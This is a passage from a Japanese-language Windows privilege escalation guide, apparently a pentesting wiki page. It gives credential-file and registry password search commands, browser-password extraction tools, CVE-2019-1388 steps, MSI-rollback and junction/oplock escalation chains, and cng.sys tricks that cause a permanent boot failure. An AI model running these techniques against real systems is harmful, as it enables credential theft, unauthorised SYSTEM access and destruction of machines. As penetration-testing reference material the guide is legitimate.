dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### RecycleBin 内の認証情報

アクセス可能なごみ箱の項目を確認し、削除されたバックアップや構成アーカイブ、名前に認証情報が明記されたファイルを探します。有用な `.7z`、`.zip`、`.rar` バックアップは数か月前のもので、ありふれたファイル名が付いている場合もあります。Windows は元のパスと削除時刻を `$I` レコードに、削除されたファイルを対応する `$R` エントリに保存します。アーカイブを開く前に、メタデータと現在のIDが持つ読み取りアクセス権を確認してください。表示される内容はボリューム、ユーザー SID、ファイル権限によって異なるため、一覧が空でも復元可能なバックアップが存在しないとは限りません。アーカイブ名は調査候補として扱い、有効なシークレットが含まれている証拠とは見なさないでください。

アクセス可能な削除済み `.pfx` は、**code-signing** の手掛かりになることもあります。アクセス可能な秘密鍵が含まれていれば、その鍵で変更した PowerShell スクリプトに署名できます。[PowerShell requires a code-signing certificate with a private key](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature)、[AppLocker publisher rules evaluate the signer's identity and rule scope](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker)。別アカウントで実行するには、現在のIDが対象のスクリプトそのものを変更できること、適用されるルールがそのスクリプトと対象アカウントに対する変更後の署名を許可すること、そしてスケジュールされたタスクなど、より高い権限で動作する仕組みが実際にそのスクリプトを実行することが必要です。`.pfx` というファイル名、証明書のサブジェクト、または書き込み可能なスクリプトだけでは、この一連の条件が満たされているとは言えません。秘密鍵の情報を開いたりタスクを実行したりする前に、メタデータ、ACL、ポリシー、スケジュールされたコマンドを確認してください。

また、アクセス可能なメッセージングクライアントのプロファイルデータベース、メモ、受信ファイルも確認し、認証情報の手掛かりを探します。BitLocker 回復キーのエクスポートは HTML または TXT として保存されていることがあり、名前の付いたバックアップアーカイブに含まれている場合もあります。こうした資料から、古いバックアップを含む別の暗号化データボリュームにアクセスできることがあります。アクセスが許可されている場合に限り、ボリュームとアーカイブを調査してください。バックアップに `NTDS.dit` が含まれている場合、オフラインでのドメイン認証情報の復元には対応する `SYSTEM` ハイブも必要です。詳細は[backup and privileged-groups workflow](../active-directory-methodology/privileged-groups-and-token-privileges.md)を参照してください。ファイル名やロックされたボリュームだけでは、利用可能な回復キーやドメインバックアップが存在するとは言えません。

複数のプログラムに保存された**パスワードを復元する**には、次を利用できます: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### レジストリ内

**認証情報を含む可能性のあるその他のレジストリキー**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**レジストリからopenssh keysを抽出する。**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザーの履歴

**Chrome、Edge、Firefox** のパスワードが保存されているデータベースを確認してください。\
また、ブラウザーの履歴、ブックマーク、お気に入りも確認してください。そこに**パスワードが**保存されている可能性があります。

現在のユーザーの標準的なEdge **Default** プロファイルでは、`Login Data` は `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default` にあり、`Local State` は親ディレクトリの `User Data` にあります。[Microsoftのドキュメントには既定のプロファイルの場所が記載されています](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars)。別のプロファイルや `UserDataDir` ポリシーによって、場所が変更されることがあります。ファイルが存在することは、認証情報が保存されている可能性を示すにすぎません。ファイルを読み取れること、該当ユーザーのDPAPIコンテキストまたはその他の承認済み鍵情報を利用できること、保存されたログイン情報がより高い権限を持つアカウントのものかどうかを確認してください。パスのみを列挙する場合、データベースを開いたり、復号したパスワードを出力したりする必要はありません。

Firefoxについては、[Mozillaのドキュメント](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile)によると、プロファイル内の `key4.db` と `logins.json` は、対になった鍵ファイルと暗号化されたログイン情報のファイルです。これらのファイルが存在することは、手掛かりにすぎません。両方のファイルを読み取れるか、保存されたエントリがあるか、Primary Passwordで鍵が保護されているかを確認してから、認証情報が利用可能と判断してください。復元した認証情報がドメインアカウントのものなら、そのアカウントに実効的なグループ制御権限があるか、また、そのグループに[LAPSパスワードの読み取り権限または復号権限](../active-directory-methodology/laps.md)があるかを個別に確認してください。ブラウザーのアーティファクトだけでは、管理者権限への経路があるとは判断できません。

ブラウザーからパスワードを抽出するツール:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** はWindowsオペレーティングシステムに組み込まれた技術で、異なる言語で記述されたソフトウェアコンポーネント間の**相互通信**を可能にします。各COMコンポーネントは**クラスID (CLSID)** で識別され、各コンポーネントは1つ以上のインターフェースを通じて機能を公開します。インターフェースはインターフェースID (IID) で識別されます。

COMクラスとインターフェースは、それぞれレジストリの **HKEY\CLASSES\ROOT\CLSID** と **HKEY\CLASSES\ROOT\Interface** に定義されています。このレジストリは、**HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT** をマージして作成されます。

このレジストリのCLSID内には、子レジストリ **InProcServer32** があります。ここには、**DLL** を指す**既定値**と、**Apartment** (シングルスレッド)、**Free** (マルチスレッド)、**Both** (シングルまたはマルチスレッド)、**Neutral** (スレッドニュートラル) のいずれかを指定する **ThreadingModel** という値が含まれています。

![ブラウザーの履歴 - COM DLL Overwriting: このレジストリのCLSID内には、子レジストリInProcServer32があります。ここには、DLLを指す既定値と、値...](<../../images/image (729).png>)

基本的に、実行されるDLLを**上書き**できれば、そのDLLが別のユーザーによって実行される場合に**権限を昇格**できる可能性があります。

攻撃者がCOM Hijackingを永続化の仕組みとしてどのように利用するかについては、以下を参照してください:


{{#ref}}
com-hijacking.md
{{#endref}}

### **ファイルとレジストリ内の一般的なパスワード検索**

**ファイルの内容を検索**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**特定のファイル名を持つファイルを検索する**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**レジストリ内でキー名とパスワードを検索する**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### パスワードを検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **は msf の**プラグインで、被害者のシステム内で認証情報を検索するすべての Metasploit POST module を**自動的に実行するために**私が作成しました。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は、このページで紹介しているパスワードを含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) は、システムからパスワードを抽出するもう1つの優れたツールです。

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) は、データを平文で保存する複数のツール（PuTTY、WinSCP、FileZilla、SuperPuTTY、RDP）の**セッション**、**ユーザー名**、**パスワード**を検索します。

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

**SYSTEM として実行されているプロセスが、フルアクセス権で新しいプロセスを開く** (`OpenProcess()`) とします。同じプロセスが、**メインプロセスのすべてのオープンハンドルを継承する、低い権限で実行される新しいプロセスも作成する** (`CreateProcess()`) とします。\
その後、**低権限プロセスへのフルアクセス権**を取得できれば、`OpenProcess()` で作成された**特権プロセスへのオープンハンドル**を取得し、**shellcode を inject** できます。\
この脆弱性の**検出方法と悪用方法**については、[こちらの例](leaked-handle-exploitation.md)を参照してください。\
異なる権限レベル（フルアクセスに限らない）で継承されたプロセスやスレッドのオープンハンドルをテストし、悪用する方法について、より詳しい説明は[こちらの別の記事](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)を参照してください。

## Named Pipe Client Impersonation

**pipes** と呼ばれる共有メモリセグメントにより、プロセス間の通信とデータ転送が可能になります。

Windows には **Named Pipes** という機能があり、異なるネットワーク上にある場合でも、無関係なプロセス間でデータを共有できます。これは client/server アーキテクチャに似ており、役割は **named pipe server** と **named pipe client** として定義されます。

**client** が pipe 経由でデータを送信すると、pipe を設定した **server** は、必要な **SeImpersonate** 権限を持っていれば、**client の identity を偽装**できます。偽装できる pipe を介して通信する**特権プロセス**を特定すれば、そのプロセスが設定した pipe とやり取りした際にその identity を採用し、**より高い権限を取得**できる可能性があります。この攻撃の実行方法については、[**こちら**](named-pipe-client-impersonation.md)と[**こちら**](#from-high-integrity-to-system)に役立つガイドがあります。

また、次のツールを使うと、burp のようなツールで **named pipe の通信を intercept** できます: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept)。さらに、**privescs を探すために pipe を一覧表示して確認できる**ツールもあります: [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony service (TapiSrv) は、server モードで `\\pipe\\tapsrv` (MS-TRP) を公開します。リモートの認証済み client は、mailslot ベースの非同期イベント経路を悪用して、`ClientAttach` を任意の既存ファイルへの**4-byte write**に変えることができます。このファイルは `NETWORK SERVICE` が書き込み可能である必要があります。その後、Telephony の admin 権限を取得して、service として任意の DLL を load できます。全体の流れは次のとおりです。

- `pszDomainUser` に書き込み可能な既存パスを設定して `ClientAttach` を実行する → service は `CreateFileW(..., OPEN_EXISTING)` でそのファイルを開き、非同期イベントの書き込みに使用します。
- 各イベントは、`Initialize` で指定された攻撃者制御の `InitContext` をそのハンドルに書き込みます。`LRegisterRequestRecipient` (`Req_Func 61`) で line app を登録し、`TRequestMakeCall` (`Req_Func 121`) を実行して、`GetAsyncEvents` (`Req_Func 0`) で取得します。その後、登録解除と shutdown を行うことで、同じ書き込みを確実に繰り返せます。
- `C:\Windows\TAPI\tsec.ini` の `[TapiAdministrators]` に自分を追加して再接続し、任意の DLL path を指定して `GetUIDllName` を呼び出すと、`NETWORK SERVICE` として `TSPI_providerUIIdentify` が実行されます。

詳細:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### Windows で実行可能な File Extension

**[https://filesec.io/](https://filesec.io/)** を確認してください。

### Markdown renderer 経由の Protocol handler / ShellExecute の悪用

`ShellExecuteExW` に渡されるクリック可能な Markdown link は、危険な URI handler (`file:`, `ms-appinstaller:`、または登録済みの任意の scheme) を起動し、現在の user として攻撃者制御のファイルを実行する可能性があります。詳細:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **パスワードを含む Command Line の監視**

user として shell を取得したとき、**command line に credentials を渡して**実行されている scheduled task やその他の process が存在する場合があります。以下の script は 2 秒ごとに process の command line を取得し、現在の状態を前回の状態と比較して、差分を出力します。

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## プロセスからパスワードを窃取する

## 低権限ユーザーから NT\AUTHORITY SYSTEM へ（CVE-2019-1388） / UAC Bypass

コンソールまたは RDP 経由でグラフィカルインターフェースにアクセスでき、UAC が有効な場合、Microsoft Windows の一部のバージョンでは、非特権ユーザーから「NT\AUTHORITY SYSTEM」としてターミナルやその他のプロセスを実行できます。

これにより、同じ脆弱性を利用して、権限昇格と UAC のバイパスを同時に実行できます。さらに、何かをインストールする必要はなく、このプロセスで使用されるバイナリは Microsoft によって署名、発行されています。

影響を受けるシステムには、以下のものがあります。

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

この脆弱性を悪用するには、次の手順を実行する必要があります。

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium から High Integrity Level への昇格 / UAC Bypass

**Integrity Levels について学ぶには、こちらを読んでください**:


{{#ref}}
integrity-levels.md
{{#endref}}

次に、**UAC と UAC bypasses について学ぶには、こちらを読んでください**:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Served Root への Upload Directory Junctions

アプリケーションが予測可能な upload subdirectory を作成し、呼び出し元が指定したファイル名をその中に書き込んでから、ファイルを処理することがあります。低権限ユーザーがサーバー側の書き込みより前にその subdirectory を削除し、NTFS junction に置き換えられる場合、書き込みが junction をたどって web-served directory に到達する可能性があります。サーバーがそのファイル形式を実行する場合、そこに配置されたスクリプトは web-service identity で実行される可能性があります。これはアプリケーション固有の任意書き込み境界であり、書き込み可能な upload directory や既存の junction だけでは、それが成立する証明にはなりません。

upload handler での正確なパス構築とタイミング、ユーザーがその subdirectory に対して持つ実効的な削除・作成権限、宛先の実効 ACL、書き込み処理が reparse point をたどるかどうか、そして web server が宛先でファイルを実行するかどうかを確認してください。書き込み処理と web server のプロセス ID は、それぞれ個別に確認してください。受動的なインベントリではディレクトリ ACL と reparse metadata を確認できますが、handler の動作や将来の junction 置き換えまでは確認できません。実行が service account で行われる場合、別の token-privilege 経路を検討する前に、**実際のプロセストークン**を調査してください。

## 任意のフォルダー削除/移動/名前変更から SYSTEM EoP へ

[**このブログ記事**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)で説明されている手法と、[**こちらで入手できる exploit code**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)。<sup>[[31]](#references)[[32]](#references)</sup>

この攻撃は基本的に、Windows Installer の rollback 機能を悪用し、アンインストール中に正規のファイルを悪意のあるファイルに置き換えます。そのため、攻撃者は **malicious MSI installer** を作成し、これを使って `C:\Config.Msi` フォルダーを乗っ取る必要があります。このフォルダーは、後に Windows Installer が他の MSI package のアンインストール中に rollback files を保存するために使用します。その際、rollback files は悪意のある payload を含むように改変されています。

手法の概要は次のとおりです。

1. **Stage 1 – Hijack の準備（`C:\Config.Msi` を空にする）**

- Step 1: MSI をインストールする
    - 書き込み可能なフォルダー（`TARGETDIR`）に無害なファイル（例: `dummy.txt`）をインストールする `.msi` を作成します。
    - **"UAC Compliant"** としてインストーラーを設定し、**non-admin user** が実行できるようにします。
    - インストール後もファイルへの **handle** を開いたままにします。

- Step 2: アンインストールを開始する
    - 同じ `.msi` をアンインストールします。
    - アンインストール処理によってファイルが `C:\Config.Msi` に移動され、`.rbf` ファイル（rollback backups）に名前が変更され始めます。
    - `GetFinalPathNameByHandle` を使って開いたファイル handle を **poll** し、ファイルが `C:\Config.Msi\<random>.rbf` になったことを検知します。

- Step 3: カスタム同期処理
    - `.msi` には、次の処理を行う **custom uninstall action (`SyncOnRbfWritten`)** が含まれています。
        - `.rbf` の書き込み完了を通知する。
        - その後、アンインストールを続行する前に、別のイベントを待機する。

- Step 4: `.rbf` の削除をブロックする
    - 通知を受けたら、`FILE_SHARE_DELETE` を指定せずに `.rbf` ファイルを開きます。これにより、**削除を防止**します。
    - その後、アンインストールが完了できるように通知を返します。
    - Windows Installer は `.rbf` を削除できず、すべての内容を削除できないため、**`C:\Config.Msi` は削除されません**。

- Step 5: `.rbf` を手動で削除する
    - 攻撃者が `.rbf` ファイルを手動で削除します。
    - これで **`C:\Config.Msi` は空になり**、乗っ取りの準備が整います。

> この時点で、**SYSTEM-level の任意フォルダー削除 vulnerability を発動させて** `C:\Config.Msi` を削除します。

2. **Stage 2 – Rollback Scripts を悪意のあるものに置き換える**

- Step 6: 弱い ACL で `C:\Config.Msi` を再作成する
    - `C:\Config.Msi` フォルダーを自分で再作成します。
    - **弱い DACL**（例: Everyone:F）を設定し、`WRITE_DAC` を持つ **handle** を開いたままにします。

- Step 7: 別のインストールを実行する
    - 次の設定で `.msi` をインストールします。
        - `TARGETDIR`: 書き込み可能な場所。
        - `ERROROUT`: 強制的に失敗させる変数。
    - このインストールは、`.rbs` と `.rbf` を読み込む **rollback** を再び発生させるために使用します。

- Step 8: `.rbs` を監視する
    - `ReadDirectoryChangesW` を使って `C:\Config.Msi` を監視し、新しい `.rbs` が現れるのを待ちます。
    - そのファイル名を記録します。

- Step 9: Rollback の前に同期する
    - `.msi` には、次の処理を行う **custom install action (`SyncBeforeRollback`)** が含まれています。
        - `.rbs` の作成時にイベントを通知する。
        - その後、処理を続行する前に待機する。

- Step 10: 弱い ACL を再設定する
    - `.rbs created` イベントを受け取ると:
        - Windows Installer は `C:\Config.Msi` に強い ACL を**再適用**します。
        - しかし、`WRITE_DAC` を持つ handle をまだ保持しているため、弱い ACL を**再適用**できます。

> ACL は **handle を開くときにのみ適用される**ため、フォルダーへの書き込みは引き続き可能です。

- Step 11: 偽の `.rbs` と `.rbf` を配置する
    - `.rbs` ファイルを上書きし、Windows に次の処理を指示する **偽の rollback script** を書き込みます。
        - `.rbf` ファイル（悪意のある DLL）を、特権が必要な場所（例: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）に復元する。
    - **SYSTEM-level の悪意のある payload DLL** を含む偽の `.rbf` を配置します。

- Step 12: Rollback を発動させる
    - 同期イベントを通知し、インストーラーを再開させます。
    - 既知のタイミングでインストールを**意図的に失敗させる**よう、**type 19 custom action (`ErrorOut`)** が設定されています。
    - これにより **rollback が開始**します。

- Step 13: SYSTEM が DLL をインストールする
    - Windows Installer は次の処理を行います。
        - 悪意のある `.rbs` を読み込む。
        - `.rbf` DLL をターゲットの場所にコピーする。
    - これで **SYSTEM が読み込むパスに悪意のある DLL が配置されます**。

- 最終ステップ: SYSTEM コードを実行する
    - 乗っ取った DLL を読み込む、信頼された **auto-elevated binary**（例: `osk.exe`）を実行します。
    - **これで**コードが **SYSTEM として実行されます**。


### 任意のファイル削除/移動/名前変更から SYSTEM EoP へ

主要な MSI rollback technique（前述）は、`C:\Config.Msi` のような **フォルダー全体**を削除できることを前提としています。しかし、vulnerability によって許可されるのが **任意のファイル削除のみ**の場合はどうでしょうか？

**NTFS internals** を悪用できます。すべてのフォルダーには、次の名前の隠し alternate data stream があります:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

このストリームには、フォルダーの**インデックスメタデータ**が格納されています。

そのため、フォルダーの`::$INDEX_ALLOCATION`ストリームを**削除**すると、NTFSはファイルシステムから**フォルダー全体を削除**します。

これは、次のような標準のファイル削除APIを使って実行できます。
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> *file* delete API を呼び出しているのに、**フォルダー自体が削除されます**。

### フォルダーの内容の削除から SYSTEM EoP へ
任意のファイルやフォルダーを削除できる primitive ではなくても、攻撃者が制御するフォルダーの**内容を削除できる**場合はどうでしょうか？

1. Step 1: おとりのフォルダーとファイルを用意する
- 作成: `C:\temp\folder1`
- その中に作成: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` に **oplock** を設定する
- 特権プロセスが `file1.txt` を削除しようとすると、oplock により**実行が一時停止します**。

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Step 3: SYSTEM process をトリガーする（例: `SilentCleanup`）
- このプロセスはフォルダー（例: `%TEMP%`）をスキャンし、その内容を削除しようとします。
- `file1.txt` に到達すると、**oplock がトリガーされ**、制御がコールバックに渡されます。

4. Step 4: oplock コールバック内で削除先をリダイレクトする

- Option A: `file1.txt` を別の場所に移動する
    - oplock を解除せずに `folder1` を空にできます。
    - `file1.txt` を直接削除しないでください。oplock が早期に解除されます。

- Option B: `folder1` を **junction** に変換する:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Option C: `\RPC Control` に **symlink** を作成する:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> これはフォルダーのメタデータを格納する NTFS の内部ストリームを対象としており、これを削除するとフォルダーが削除されます。

5. ステップ 5: oplock を解放する
- SYSTEM プロセスは処理を続け、`file1.txt` を削除しようとします。
- しかし、junction + symlink により、実際に削除されるのは次のものです。
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**結果**: `C:\Config.Msi` は SYSTEM によって削除されます。

### 任意のフォルダー作成から恒久的な DoS へ

**任意のフォルダーを SYSTEM/admin として作成できる**プリミティブを悪用します。**ファイルを書き込めない**場合や、**弱い権限を設定できない**場合でも可能です。

次のように、**重要な Windows ドライバー**の名前を付けた**フォルダー**（ファイルではありません）を作成します。
```
C:\Windows\System32\cng.sys
```

- このパスは通常、`cng.sys` カーネルモードドライバーに対応します。
- **事前にフォルダーとして作成しておくと**、Windows は起動時に実際のドライバーを読み込めなくなります。
- その後、Windows は起動時に `cng.sys` を読み込もうとします。
- フォルダーを検出すると、**実際のドライバーを解決できず**、**クラッシュするか、起動が停止します**。
- **フォールバックはなく**、外部からの介入（ブート修復やディスクアクセスなど）がなければ**復旧できません**。

### 特権ログ／バックアップパスと OM symlink による任意ファイルの上書き／起動 DoS

**特権サービス**が**書き込み可能な設定ファイル**から読み取ったパスにログ／エクスポートを書き込む場合、**Object Manager symlinks + NTFS mount points** でそのパスをリダイレクトすれば、（SeCreateSymbolicLinkPrivilege がなくても）特権による書き込みを任意ファイルの上書きに利用できます。<sup>[[15]](#references)</sup>

**要件**
- 攻撃者が、書き込み先パスを格納した設定ファイル（例：`%ProgramData%\...\.ini`）に書き込めること。
- `\RPC Control` への mount point と OM file symlink を作成できること（James Forshaw の [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。<sup>[[16]](#references)[[17]](#references)</sup>
- そのパスに書き込む特権操作（ログ、エクスポート、レポート）。

**攻撃の例**
1. 設定ファイルを読み、特権ログの出力先（例：`C:\ProgramData\ICONICS\IcoSetup64.ini` 内の `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`）を特定します。
2. admin 権限なしでパスをリダイレクトします。
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 特権コンポーネントがログを書き込むのを待ちます（例: 管理者が「テスト SMS を送信」を実行）。書き込み先は `C:\Windows\System32\cng.sys` になります。
4. 上書きされたターゲットを（hex/PE parser で）調べて破損を確認します。再起動すると、Windows は改ざんされたドライバーパスから読み込もうとし、**boot loop DoS** が発生します。この方法は、特権サービスが書き込み用に開く保護対象ファイル全般にも応用できます。

> `cng.sys` は通常 `C:\Windows\System32\drivers\cng.sys` から読み込まれますが、`C:\Windows\System32\cng.sys` にコピーが存在すると、そちらが先に試されることがあり、破損データの信頼性の高い DoS sink になります。



## **High Integrity から SYSTEM へ**

### **新しいサービス**

すでに High Integrity プロセスで実行している場合、**SYSTEM への経路**は、**新しいサービスを作成して実行する**だけで簡単に確保できることがあります:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> service binaryを作成する場合は、有効なserviceであること、またはbinaryが必要なアクションを素早く実行することを確認してください。有効なserviceでない場合、20秒で強制終了されます。

### AlwaysInstallElevated

High Integrityプロセスから、**AlwaysInstallElevatedレジストリエントリを有効に**して、_**.msi**_ wrapperを使ってreverse shellを**インストール**できます。\
[関連するレジストリキーと_.msi_ packageのインストール方法について詳しくはこちら。](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**コードは** [**こちらで確認できます**](seimpersonate-from-high-to-system.md)**。**

### From SeDebug + SeImpersonate to Full Token privileges

これらのtoken privilegesがある場合（おそらく、すでにHigh Integrityのプロセス内で見つかります）、SeDebug privilegeを使って（protected processesを除く）**ほぼすべてのプロセスを開き**、そのプロセスのtokenを**コピー**して、そのtokenを使って**任意のプロセスを作成**できます。\
この手法では通常、**すべてのtoken privilegesを持つSYSTEM実行中のプロセスを選択します**（_すべてのtoken privilegesを持たないSYSTEMプロセスも見つかります_）。\
**提案した手法を実行するコードの** [**例はこちらで確認できます**](sedebug-+-seimpersonate-copy-token.md)**。**

### **Named Pipes**

この手法は、`getsystem`でmeterpreterが使用します。手法では、**pipeを作成してから、そのpipeに書き込むserviceを作成または悪用します**。その後、**`SeImpersonate`** privilegeを使ってpipeを作成した**server**は、pipeのclient（service）のtokenを**impersonate**し、SYSTEM privilegesを取得できます。\
[**named pipesについて詳しく知りたい場合はこちらをお読みください**](#named-pipe-client-impersonation)。\
[name pipesを使ってhigh integrityからSystemに昇格する**例はこちらをお読みください**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

**SYSTEMとして実行されている**プロセスによって**ロード**されるdllを**hijack**できれば、その権限で任意のコードを実行できます。そのため、Dll Hijackingもこの種のprivilege escalationに有効です。さらに、dllのロードに使われるフォルダーへの**write permissions**があるため、High Integrityプロセスからは**はるかに簡単に実行できます**。\
**Dll hijackingについては** [**こちらで詳しく学べます**](dll-hijacking/index.html)**。**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**参照:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windowsのローカルprivilege escalationの手法を探すのに最適なtool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurationsと機密ファイルを確認 (**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)。検出済み。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 考えられるmisconfigurationsを確認し、情報を収集 (**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurationsを確認**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、RDPの保存済みセッション情報を抽出します。ローカルでは-Thoroughを使用してください。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Managerからcredentialsを抽出します。検出済み。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集したpasswordsをdomain全体でsprayします**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- InveighはPowerShellベースのADIDNS/LLMNR/mDNS spooferおよびman-in-the-middle toolです。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的なprivesc向けWindows enumeration**\
